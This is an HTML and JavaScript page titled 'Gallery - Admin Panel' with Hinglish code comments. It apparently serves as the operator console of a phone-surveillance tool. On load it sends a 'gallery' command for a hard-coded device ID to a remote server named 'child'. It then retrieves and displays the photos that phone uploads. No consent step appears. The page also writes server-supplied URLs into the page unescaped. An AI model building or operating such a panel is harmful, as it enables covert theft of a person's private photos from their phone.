<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gallery - Admin Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg: #0a0a0a;
            --accent: #00ff88;
            --glass: rgba(255, 255, 255, 0.05);
        }

        body {
            background: var(--bg); color: white;
            font-family: sans-serif; margin: 0; padding: 20px;
        }

        .header {
            display: flex; align-items: center; justify-content: space-between;
            margin-bottom: 30px; border-bottom: 1px solid #333; padding-bottom: 15px;
        }

        .back-btn { color: white; font-size: 1.5rem; text-decoration: none; }

        .gallery-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
            gap: 15px;
        }

        .img-card {
            aspect-ratio: 1; background: var(--glass);
            border-radius: 12px; overflow: hidden;
            border: 1px solid rgba(255, 255, 255, 0.1);
            cursor: pointer; transition: 0.3s;
        }

        .img-card:hover { border-color: var(--accent); transform: scale(1.05); }
        .img-card img { width: 100%; height: 100%; object-fit: cover; }

        .preview-modal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.9); display: none;
            align-items: center; justify-content: center; z-index: 1000;
        }

        .preview-modal img { max-width: 90%; max-height: 80%; border-radius: 10px; }
        .close-pv { position: absolute; top: 20px; right: 30px; font-size: 2rem; cursor: pointer; }

        .loader { text-align: center; padding: 50px; color: var(--accent); }
    </style>
</head>

<body>
    <div class="header">
        <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
        <h2><i class="fa-solid fa-images" style="color:var(--accent)"></i> Gallery</h2>
        <button onclick="fetchGallery()" style="background:none; border:none; color:var(--accent); cursor:pointer; font-size:1.2rem;">
            <i class="fa-solid fa-rotate"></i>
        </button>
    </div>

    <div class="gallery-grid" id="gallery">
        <div class="loader">
            <i class="fa-solid fa-spinner fa-spin fa-2x"></i>
            <p>Loading Images...</p>
        </div>
    </div>

    <div class="preview-modal" id="pvModal" onclick="this.style.display='none'">
        <span class="close-pv">&times;</span>
        <img id="pvImg" src="">
    </div>

    <script>
        const SERVER_URL = "https://child-v9no.onrender.com";
        const DEVICE_ID = "M2103K19I";

        document.addEventListener("DOMContentLoaded", () => {
            // Gallery fetch karne ka command bhejo
            sendCommand();
            // 5 second baad images check karo
            setTimeout(fetchGallery, 5000);
        });

        function sendCommand() {
            fetch(`${SERVER_URL}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device_id: DEVICE_ID, command: 'gallery' })
            }).then(() => console.log("Gallery Command Sent"));
        }

        async function fetchGallery() {
            const container = document.getElementById("gallery");

            try {
                // Hum server se un sabhi images ki list maang rahe hain jo M2103K19I ne upload ki hain
                const response = await fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/gallery?t=${new Date().getTime()}`);
                const images = await response.json();

                if (!images || images.length === 0) {
                    container.innerHTML = "<p style='grid-column: 1/-1; text-align:center;'>No images found yet. Phone is processing...</p>";
                    return;
                }

                container.innerHTML = ""; 
                images.forEach(imgUrl => {
                    const card = document.createElement("div");
                    card.className = "img-card";
                    // imgUrl poora path hoga like: https://child-v9no.onrender.com/uploads/M2103K19I/gallery/1.jpg
                    card.innerHTML = `<img src="${imgUrl}" onclick="openPreview('${imgUrl}')" onerror="this.src='https://via.placeholder.com/150?text=Error'">`;
                    container.appendChild(card);
                });

            } catch (err) {
                container.innerHTML = "<p style='grid-column: 1/-1; text-align:center;'>Waiting for device to upload images...</p>";
            }
        }

        function openPreview(src) {
            document.getElementById('pvImg').src = src;
            document.getElementById('pvModal').style.display = 'flex';
        }
    </script>
</body>
</html>
